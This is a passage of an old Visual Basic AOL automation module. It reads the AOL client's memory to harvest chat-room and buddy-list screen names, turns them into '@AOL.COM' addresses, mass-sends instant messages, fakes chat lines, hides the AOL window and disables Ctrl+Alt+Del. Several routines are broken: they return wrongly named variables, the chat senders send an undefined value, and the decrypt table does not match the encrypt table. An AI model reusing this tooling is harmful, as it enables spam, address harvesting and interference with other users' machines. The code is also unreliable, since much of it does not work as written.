Text_TurntoLCase = LCase(txt)
End Function
Sub PlayWav16(File)
'The 16-Bit Playwav
SoundName$ = File
SoundFlags& = &H20000 Or &H1
Snd& = sndplaysound(SoundName$, SoundFlags&)
End Sub


Sub AOLChangeCaption(newcaption As String)
Call AOLSetText(AOLWindow(), newcaption)
End Sub

Sub AOLBuddyBLOCK(SN As TextBox)
BUDLIST% = FindChildByTitle(AOLMDI(), "Buddy List Window")
Locat% = FindChildByClass(BUDLIST%, "_AOL_ICON")
IM1% = getwindow(Locat%, GW_HWNDNEXT)
setup% = getwindow(IM1%, GW_HWNDNEXT)
AOLIcon (setup%)
Pause (2)
STUPSCRN% = FindChildByTitle(AOLMDI(), AOLGetUser & "'s Buddy Lists")
Creat% = FindChildByClass(STUPSCRN%, "_AOL_ICON")
Edit% = getwindow(Creat%, GW_HWNDNEXT)
Delete% = getwindow(Edit%, GW_HWNDNEXT)
view% = getwindow(Delete%, GW_HWNDNEXT)
PRCYPREF% = getwindow(view%, GW_HWNDNEXT)
AOLIcon PRCYPREF%
Pause (1.8)
Call AOLKillWindow(STUPSCRN%)
Pause (2)
PRYVCY% = FindChildByTitle(AOLMDI(), "Privacy Preferences")
DABUT% = FindChildByTitle(PRYVCY%, "Block only those people whose screen names I list")
AOLButton (DABUT%)
DaPERSON% = FindChildByClass(PRYVCY%, "_AOL_EDIT")
Call AOLSetText(DaPERSON%, SN)
Creat% = FindChildByClass(PRYVCY%, "_AOL_ICON")
Edit% = getwindow(Creat%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
Edit% = getwindow(Edit%, GW_HWNDNEXT)
AOLIcon Edit%
Pause (1)
Save% = getwindow(Edit%, GW_HWNDNEXT)
Save% = getwindow(Save%, GW_HWNDNEXT)
Save% = getwindow(Save%, GW_HWNDNEXT)
AOLIcon Save%
End Sub
Public Sub AOL4_AddRoom(Listboxes As ListBox)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = AOL4_FindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Listboxes.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub

Sub AOL4_BuddyVIEW()
Call AOL4_Keyword("Buddy View")
End Sub
Sub AOL4_AddBuddyListToListBox(lst As ListBox)
'This adds the AOL Buddy List to a VB listbox
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = FindChildByTitle(AOLMDI(), "Buddy List Window")
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
lst.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub
Function AOLRoomCount()
thechild% = AOLFindRoom()
Lister% = FindChildByClass(thechild%, "_AOL_Listbox")
getcount = SendMessage(Lister%, LB_GETCOUNT, 0, 0)
AOLRoomCount = getcount
End Function
Function Chat_RoomName()
Call GetCaption(AOLFindRoom)
End Function
Function AOLChatText()
'This will store all text from the chat window
RICH% = FindChildByClass(AOLFindRoom(), "RICHCNTL")
txt% = GetWinText(RICH%)
AOLChatText = txt%
End Function

Function AOL4_ChatText()
'This will store all text from the chat window
RICH% = FindChildByClass(AOL4_FindRoom(), "RICHCNTL")
txt% = GetWinText(RICH%)
AOL40_GetChat = txt%
End Function

Sub AOLCreateMenu(mnuTitle As String, mnuPopUps As String)
'  This sub will append menus to AOL.  You need to assign
'  mnuPopUps$ a series of menus and indexes;
'  <menuName:Index;menuName:Index>
'  Here is an Example:

'  MenusToAdd$ = "New Item:1;&File:2;Killer:3"
'  Call Create_Menu("&Test", MenusToAdd$)

aol% = findwindow("AOL Frame25", vbNullString)
If aol% = 0 Then Exit Sub
aolmenu% = Getmenu(aol%)
hMenuPopup% = CreatePopupMenu()
SplitterCounter% = 0
For i = 1 To Len(mnuPopUps$)
ExamineChar$ = Mid$(mnuPopUps$, i, 1)
If ExamineChar$ = ":" Then SplitterCounter% = SplitterCounter% + 1
Next i
Egg$ = mnuPopUps$
For i = 0 To SplitterCounter%
If Egg$ = "" Then Exit For
If InStr(Egg$, ":") = 0 Then Exit For
mnuName$ = Left$(Egg$, InStr(Egg$, ":") - 1)
'Egg$ = Script(Egg$, mnuName$ & ":", "")
If InStr(Egg$, ";") <> 0 Then
mnuIndex% = CInt(Left(Egg$, InStr(Egg$, ";") - 1))
Else
mnuIndex% = CInt(Egg$)
End If
'Egg$ = Script(Egg$, Script(Str(mnuIndex%), " ", "") & ";", "")
Q% = AppendMenu(hMenuPopup%, MF_ENABLED Or MF_STRING, mnuIndex%, mnuName$)
Next i
Q% = AppendMenu(aolmenu%, MF_STRING Or MF_POPUP, hMenuPopup%, mnuTitle$)
DrawMenuBar aol%

End Sub

Public Sub Disable_CTRL_ALT_DEL()
'Disables the Crtl+Alt+Del
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub

Public Sub Enable_CTRL_ALT_DEL()
'Enables the Crtl+Alt+Del
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub

Function Text_Colored(strin As String)
'Returns the strin Colored
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "<font color=" & """" & "#ff0000" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#ff8040" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#008080" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#008000" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#0000ff" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#808000" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#800080" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#000000" & """" & ">"
Let Newsent$ = Newsent$ + NextChr$
Let NextChr$ = NextChr$ + "<font color=" & """" & "#808080" & """" & " > """
Loop
r_Coor = Newsent$
End Function

Function Text_Decrypt(strin As String)
'Returns the strin encrypted
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)

If crapp% > 0 Then GoTo dustepp2

If NextChr$ = "~" Then Let NextChr$ = "A"
If NextChr$ = "`" Then Let NextChr$ = "a"
If NextChr$ = "!" Then Let NextChr$ = "B"
If NextChr$ = "@" Then Let NextChr$ = "c"
If NextChr$ = "#" Then Let NextChr$ = "c"
If NextChr$ = "$" Then Let NextChr$ = "D"
If NextChr$ = "%" Then Let NextChr$ = "d"
If NextChr$ = "^" Then Let NextChr$ = "E"
If NextChr$ = "&" Then Let NextChr$ = "e"
If NextChr$ = "*" Then Let NextChr$ = "f"
If NextChr$ = "(" Then Let NextChr$ = "H"
If NextChr$ = ")" Then Let NextChr$ = "I"
If NextChr$ = "-" Then Let NextChr$ = "i"
If NextChr$ = "_" Then Let NextChr$ = "k"
If NextChr$ = "+" Then Let NextChr$ = "L"
If NextChr$ = "=" Then Let NextChr$ = "M"
If NextChr$ = "[" Then Let NextChr$ = "m"
If NextChr$ = "]" Then Let NextChr$ = "N"
If NextChr$ = "{" Then Let NextChr$ = "n"
If NextChr$ = "O" Then Let NextChr$ = "}"
If NextChr$ = "\" Then Let NextChr$ = "o"
If NextChr$ = "|" Then Let NextChr$ = "P"
If NextChr$ = ";" Then Let NextChr$ = "p"
If NextChr$ = "'" Then Let NextChr$ = "r"
If NextChr$ = ":" Then Let NextChr$ = "S"
If NextChr$ = """" Then Let NextChr$ = "s"
If NextChr$ = "," Then Let NextChr$ = "t"
If NextChr$ = "." Then Let NextChr$ = "U"
If NextChr$ = "/" Then Let NextChr$ = "u"
If NextChr$ = "<" Then Let NextChr$ = "V"
If NextChr$ = ">" Then Let NextChr$ = "v"
If NextChr$ = "?" Then Let NextChr$ = "w"
If NextChr$ = "¥" Then Let NextChr$ = "x"
If NextChr$ = "Ä" Then Let NextChr$ = "X"
If NextChr$ = "ƒ" Then Let NextChr$ = "Y"
If NextChr$ = "Ü" Then Let NextChr$ = "y"
If NextChr$ = "¶" Then Let NextChr$ = "!"
If NextChr$ = "£" Then Let NextChr$ = "?"
If NextChr$ = "…" Then Let NextChr$ = "."
If NextChr$ = "æ" Then Let NextChr$ = ","
If NextChr$ = "q" Then Let NextChr$ = "1"
If NextChr$ = "w" Then Let NextChr$ = "%"
If NextChr$ = "e" Then Let NextChr$ = "2"
If NextChr$ = "r" Then Let NextChr$ = "3"
If NextChr$ = "t" Then Let NextChr$ = "_"
If NextChr$ = "y" Then Let NextChr$ = "-"
If NextChr$ = " " Then Let NextChr$ = " "
Let Newsent$ = Newsent$ + NextChr$

dustepp2:
If cra% > 0 Then Let cra% = cra% - 1
DoEvents
Loop
r_decrypt = Newsent$
End Function
Function Text_Encrypt(strin As String)
'Returns the strin encrypted
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)

If crapp% > 0 Then GoTo dustepp2

If NextChr$ = "A" Then Let NextChr$ = "~"
If NextChr$ = "a" Then Let NextChr$ = "`"
If NextChr$ = "B" Then Let NextChr$ = "!"
If NextChr$ = "C" Then Let NextChr$ = "@"
If NextChr$ = "c" Then Let NextChr$ = "#"
If NextChr$ = "D" Then Let NextChr$ = "$"
If NextChr$ = "d" Then Let NextChr$ = "%"
If NextChr$ = "E" Then Let NextChr$ = "^"
If NextChr$ = "e" Then Let NextChr$ = "&"
If NextChr$ = "f" Then Let NextChr$ = "*"
If NextChr$ = "H" Then Let NextChr$ = "("
If NextChr$ = "I" Then Let NextChr$ = ")"
If NextChr$ = "i" Then Let NextChr$ = "-"
If NextChr$ = "k" Then Let NextChr$ = "_"
If NextChr$ = "L" Then Let NextChr$ = "+"
If NextChr$ = "M" Then Let NextChr$ = "="
If NextChr$ = "m" Then Let NextChr$ = "["
If NextChr$ = "N" Then Let NextChr$ = "]"
If NextChr$ = "n" Then Let NextChr$ = "{"
If NextChr$ = "O" Then Let NextChr$ = "}"
If NextChr$ = "o" Then Let NextChr$ = "\"
If NextChr$ = "P" Then Let NextChr$ = "|"
If NextChr$ = "p" Then Let NextChr$ = ";"
If NextChr$ = "r" Then Let NextChr$ = "'"
If NextChr$ = "S" Then Let NextChr$ = ":"
If NextChr$ = "s" Then Let NextChr$ = """"
If NextChr$ = "t" Then Let NextChr$ = ","
If NextChr$ = "U" Then Let NextChr$ = "."
If NextChr$ = "u" Then Let NextChr$ = "/"
If NextChr$ = "V" Then Let NextChr$ = "<"
If NextChr$ = "W" Then Let NextChr$ = ">"
If NextChr$ = "w" Then Let NextChr$ = "?"
If NextChr$ = "X" Then Let NextChr$ = "¥"
If NextChr$ = "x" Then Let NextChr$ = "Ä"
If NextChr$ = "Y" Then Let NextChr$ = "ƒ"
If NextChr$ = "y" Then Let NextChr$ = "Ü"
If NextChr$ = "!" Then Let NextChr$ = "¶"
If NextChr$ = "?" Then Let NextChr$ = "£"
If NextChr$ = "." Then Let NextChr$ = "…"
If NextChr$ = "," Then Let NextChr$ = "æ"
If NextChr$ = "1" Then Let NextChr$ = "q"
If NextChr$ = "%" Then Let NextChr$ = "w"
If NextChr$ = "2" Then Let NextChr$ = "e"
If NextChr$ = "3" Then Let NextChr$ = "r"
If NextChr$ = "_" Then Let NextChr$ = "t"
If NextChr$ = "-" Then Let NextChr$ = "y"
If NextChr$ = " " Then Let NextChr$ = " "
Let Newsent$ = Newsent$ + NextChr$

dustepp2:
If crap% > 0 Then Let crap% = crap% - 1
DoEvents
Loop
r_encrypt = Newsent$
End Function


Sub SetCheckBoxToFalse(win%)
'This will set any checkbox's value to equal false
Check% = sendmessagebynum(win%, BM_SETCHECK, False, 0&)
End Sub
Sub SetCheckBoxToTrue(win%)
'This will set any checkbox's value to equal true
Check% = sendmessagebynum(win%, BM_SETCHECK, True, 0&)
End Sub

Sub Window_ChangeCaption(win, txt)
'This will change the caption of any window that you
'tell it to as long as it is a valid window
Text% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub

Sub AOL4_ChatIgnore(SN%)
room% = AOL4_FindRoom
List% = FindChildByClass(room%, "_AOL_Listbox")
End Sub
Sub AOL4_ChatManipulator(Who$, what$)
'This makes the chat room text near the VERY TOP
'what u want
view% = FindChildByClass(AOL4_FindRoom(), "RICHCNTL")
Buffy$ = Chr$(13) & Chr$(10) & "" & (Who$) & ":" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(view%, WM_SETTEXT, 0, Buffy$)
End Sub

Sub AOL4_ChatSend(txt)
'Sends text to chat on AOL 3.0 or 4.0!
'Good for AOL 4.0 and 3.0 Progs
If AOLVersion2() = "4.0" Then
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call sendmessagebynum(AORich%, WM_CHAR, 13, 0)
ElseIf AOLVersion2() = "3.0" Then
room% = AOLFindRoom()
Call AOLSetText(FindChildByClass(room%, "_AOL_Edit"), txt)
DoEvents
Call SendCharNum(FindChildByClass(room%, "_AOL_Edit"), 13)
Else
MsgBox "Error: Cannot Process Request" + Chr$(13) + Chr$(10) + "" + Chr$(13) + Chr$(10) + "AOL Version is not 3.0 or 4.0", 16, "Error"
End If
End Sub

Sub AOLChatSend(txt)
'Sends text to chat on AOL 3.0 or 4.0!
'Good for AOL 4.0 and 3.0 Progs
If AOLVersion2() = "4.0" Then
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)
AORich% = getwindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call sendmessagebynum(AORich%, WM_CHAR, 13, 0)
ElseIf AOLVersion2() = "3.0" Then
room% = AOLFindRoom()
Call AOLSetText(FindChildByClass(room%, "_AOL_Edit"), txt)
DoEvents
Call SendCharNum(FindChildByClass(room%, "_AOL_Edit"), 13)
Else
MsgBox "Error: Cannot Process Request" + Chr$(13) + Chr$(10) + "" + Chr$(13) + Chr$(10) + "AOL Version is not 3.0 or 4.0", 16, "Error"
End If
End Sub

Function Find2ndChildByClass(parentw, childhand)
'DO NOT TAMPER WITH THIS CODE!
    firs% = getwindow(parentw, 5)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    firs% = getwindow(parentw, 5)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    While firs%
        firs% = getwindow(parentw, 5)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
        firs% = getwindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found
    Wend
    Find2ndChildByClass = 0
Found:
    firs% = getwindow(firs%, 2)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    firs% = getwindow(firs%, 2)
    If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    While firs%
        firs% = getwindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
        firs% = getwindow(firs%, 2)
        If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Found2
    Wend
    Find2ndChildByClass = 0
Found2:
    Find2ndChildByClass = firs%
End Function
Sub AOL4_ClearChat()
childs% = AOL4_FindRoom()
child = FindChildByClass(childs%, "RICHCNTL")
GetTrim = sendmessagebynum(child, 13, 0&, 0&)
trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 12, GetTrim + 1, trimspace$)
theview$ = trimspace$
End Sub
Function AOL4_CountMail()
themail% = FindChildByTitle(AOLMDI(), AOLGetUser & "'s Online Mailbox")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function
Function AOL4_FindRoom()
'Finds the chat room and sets focus on it
    aol% = findwindow("AOL Frame25", vbNullString)
    mdi% = FindChildByClass(aol%, "MDIClient")
    firs% = getwindow(mdi%, 5)
    listers% = FindChildByClass(firs%, "RICHCNTL")
    Listere% = FindChildByClass(firs%, "RICHCNTL")
    Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
    Do While (listers% = 0 Or Listere% = 0 Or Listerb% = 0) And (l <> 100)
            DoEvents
            firs% = getwindow(firs%, 2)
            listers% = FindChildByClass(firs%, "RICHCNTL")
            Listere% = FindChildByClass(firs%, "RICHCNTL")
            Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
            If listers% And Listere% And Listerb% Then Exit Do
            l = l + 1
    Loop
    If (l < 100) Then
        AOL4_FindRoom = firs%
        Exit Function
    End If
    

End Function
Function AOL4_GetChat()
'This gets all the txt from chat room
childs% = AOL4_FindRoom()
child = FindChildByClass(childs%, "_AOL_View")
GetTrim = sendmessagebynum(child, 14, 0&, 0&)
trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, trimspace$)
theview$ = trimspace$
AOL4_GetChat = theview$
End Function
Function AOLGetRoomName(frm As Form)
X = GetCaption(AOLFindRoom())
AOLGetRoomName = X



End Function
Function AOL4_RoomName()
X = GetCaption(AOL4_FindRoom())
AOL4_RoomName = X
End Function

Function AOL4_GetUser()
On Error Resume Next
aol% = findwindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = getwindowtext(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOL4_GetUser = User
End Function
Sub AOL4_Hide()
a = showwindow(AOLWindow(), SW_HIDE)
End Sub
Sub AOL4_InstantMessage(Person, message)
Call AOL4_Keyword("aol://9293:" & Person)
Pause (2)
Do
DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
im% = FindChildByTitle(mdi%, "Send Instant Message")
aolrich% = FindChildByClass(im%, "RICHCNTL")
imsend% = FindChildByClass(im%, "_AOL_Icon")
Loop Until (im% <> 0 And aolrich% <> 0 And imsend% <> 0)
Call SendMessageByString(aolrich%, WM_SETTEXT, 0, message)
For sends = 1 To 9
imsend% = getwindow(imsend%, GW_HWNDNEXT)
Next sends
AOLIcon imsend%
If im% Then Call AOLKillWindow(im%)
End Sub
Sub AOL4_Keyword(txt)
    aol% = findwindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(aol%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    KWBox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(KWBox%, WM_SETTEXT, 0, txt)
    Call sendmessagebynum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call sendmessagebynum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub
Sub AOL4_LocateMember(name As String)
Call AOL4_Keyword("aol://3548:" + name)
End Sub
Sub AOL4_Mail(Person, Subject, message)
Const LBUTTONDBLCLK = &H203
aol% = findwindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(aol%, "AOL Toolbar")
tool2% = FindChildByClass(tool%, "_AOL_Toolbar")
ico3n% = FindChildByClass(tool2%, "_AOL_Icon")
Icon2% = getwindow(ico3n%, 2)
X = sendmessagebynum(Icon2%, WM_LBUTTONDOWN, 0&, 0&)
X = sendmessagebynum(Icon2%, WM_LBUTTONUP, 0&, 0&)
Pause (4)
    aol% = findwindow("AOL Frame25", vbNullString)
    mdi% = FindChildByClass(aol%, "MDIClient")
    mail% = FindChildByTitle(mdi%, "Write Mail")
    aoledit% = FindChildByClass(mail%, "_AOL_Edit")
    aolrich% = FindChildByClass(mail%, "RICHCNTL")
    subjt% = FindChildByTitle(mail%, "Subject:")
    subjec% = getwindow(subjt%, 2)
        Call AOLSetText(aoledit%, Person)
        Call AOLSetText(subjec%, Subject)
        Call AOLSetText(aolrich%, message)
e = FindChildByClass(mail%, "_AOL_Icon")
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
e = getwindow(e, GW_HWNDNEXT)
AOLIcon (e)
End Sub
Public Sub AOL4_MassIM(lst As ListBox, txt As TextBox)
lst.Enabled = False
i = lst.ListCount - 1
lst.ListIndex = 0
For X = 0 To i
lst.ListIndex = X
Call AOL4_InstantMessage(lst.Text, txt.Text)
Pause (1)
Next X
lst.Enabled = True
End Sub
Sub AOL4_OpenChat()
AOL4_Keyword ("PC")
End Sub
Sub AOL4_OpenPR(PRrm As TextBox)
Call AOL4_Keyword("aol://2719:2-2-" & PRrm)
End Sub

Sub AOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Sub AOL4_SignOff()
Call runmenubystring(AOLWindow(), "Sign Off")
End Sub
Function AOL4_SpiralScroll(txt As String)
Dim AODCOUNTER, a, thetxtlen
AODCOUNTER = 1
thetxtlen = Len(txt)
Start:
a = a + 1
If a = thetxtlen Then GoTo last
X = Text_Looping(txt)
txt = X
AOL4_ChatSend X
Pause (0.5)
AODCOUNTER = AODCOUNTER + 1
If AODCOUNTER = 4 Then
   AODCOUNTER = 2
   End If
GoTo Start
last:

End Function
Function Text_Looping(txt As String)
Dim thecaption, Captionlen, middlelen, Firstletter, Middle
If txt = "" Then GoTo dead
thecaption = txt
Captionlen = Len(thecaption)
middlelen = Captionlen - 1
Firstletter = Left$(thecaption, 1)
Middle = Right(thecaption, middlelen)
Text_Looping = Middle & Firstletter
GoTo last
dead:
Text_Looping = ""
last:
End Function
Sub AOL4_UNHide()
a = showwindow(AOLWindow(), SW_SHOW)
End Sub
Sub AOL4_UnUpChat()
die% = findwindow("_AOL_MODAL", vbNullString)
X = showwindow(aolmod%, SW_RESTORE)
Call AOL4_SetFocus
End Sub

Sub ChangeCaption(HWD%, newcaption As String)
Call AOLSetText(HWD%, newcaption)
End Sub
Function AOLGetTopWindow()
AOLGetTopWindow = Gettopwindow(AOLMDI())
End Function

Sub AOLSetFocus()
'SetFocusAPI doesn't work AOL because AOL has added
'a safeguard against other programs calling certain
'API functions (like owner-drawn things and like.)
'This is the only way known for setting the focus
'to AOL.  This is a normal VB command!
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Public Sub AOLMassIM(lst As ListBox, txt As TextBox)
lst.Enabled = False
i = lst.ListCount - 1
lst.ListIndex = 0
For X = 0 To i
lst.ListIndex = X
Call AOLInstantMessage(lst.Text, txt.Text)
Pause 0.5
Next X
lst.Enabled = True
End Sub
Public Sub AOLOnlineChecker(Person)
Call AOLInstantMessage4(Person, "Sup?")
Pause 2
AOLIMScan
End Sub
Public Sub AddRoom_ByBox(Listboxes As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = FindChildByTitle(AOLMDI, "Who's Chatting")
If room = 0 Then MsgBox "Not Open"
aolhandle = FindChildByClass(room, "_AOL_Listbox")
OLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
LOP = Len(Person$)
Person$ = Right$(Person$, LOP - 2)
Person$ = Person$ & "@AOL.COM"
If Person$ <> AOLGetUser() Then Listboxes.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub

Public Sub AddRoom(Listboxes As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
